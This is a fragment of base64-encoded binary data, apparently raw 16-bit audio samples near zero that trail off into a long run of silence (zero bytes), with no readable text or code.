b/1v/Y/93/4f/k/+X/4//l/+X/5v/p/+n/6//v//H/8//y//H/8P/v/+3/7v/w//P/9//6//n/+v/4//f//P/+/wAAAQD+//v//f////7/AQACAAIABAAFAAQABQADAAEAAgAGAAoACQALAAgACQAJAAgABgAEAAYABAAEAAUAAwAEAAUABwAJAAwADQAMAA0ADAAJAAoACQAHAAgACAAJAAoADAANAA0ADgALAAsADAANAA0ACgAJAAUABAAFAAQABQAFAAMAAAACAAQABAAGAAMAAAD+//v/+//9//7///8BAAEAAwADAP7//v/9//z//v/+//3//f/9//v///8AAP7////8//r/+f/3//b/9//4//f/+P/3//j/+f/6//z//f/9//3//P/8//7//f/9/////v///////v/+/////f/9/////f///wAAAAABAP///f/+//3//P/+//3//f////7//v8BAAEAAAACAAIAAwADAAAAAAABAAEAAAAAAAAAAQACAAIABAAEAAMAAwACAAMABQADAAIAAQABAAIAAgABAAIAAQD+//z/+//7////AAABAAMAAAAAAAIAAQABAAEAAAD//wAAAAD//wAA//8AAAIAAgACAAAAAQD/////AAD///3//f/9//v//f/+//3///8AAAAAAgACAAAAAgACAAIAAwACAAEA///+//7//v///wEAAwADAAUABAADAAMAAQAAAAEAAAAAAAAA//8AAAIAAgADAAMAAwAEAAQAAwADAAIAAQADAAIAAQABAAAAAAABAAAAAAAAAP///v/+//7//v/+//7/AAABAAEAAgABAAEAAgABAAAAAAD+//3//f/8//3//v///wAAAgACAAEAAAD//////v///////f/9//3//f/9/////v8AAAEAAQACAAIAAQABAAIAAQABAAEA////////AAAAAAAAAQABAAEAAQABAP//AAAAAP//AQAAAP/////+////AgADAAQABAACAAIAAgACAAEAAgADAAMAAgAAAAEAAQABAAAA//////////8AAAAAAQABAAAAAAABAAEAAAAAAAAA//8AAP////8AAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAP//AAAAAAAAAAAAAP////////////////7////////////+/////v/9//3//f/+//////////////8AAAEAAAAAAAAA/////wAA/v///wAA//8AAAAA/////wAAAAAAAAAA////////////////AAAAAAEAAQABAAEAAAAAAAAAAQABAAEAAQABAAEAAQACAAIAAQABAAAAAAAAAAEAAQAAAAAAAAAAAAAAAQAAAAEAAQABAAEAAQAAAAAAAAD//////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA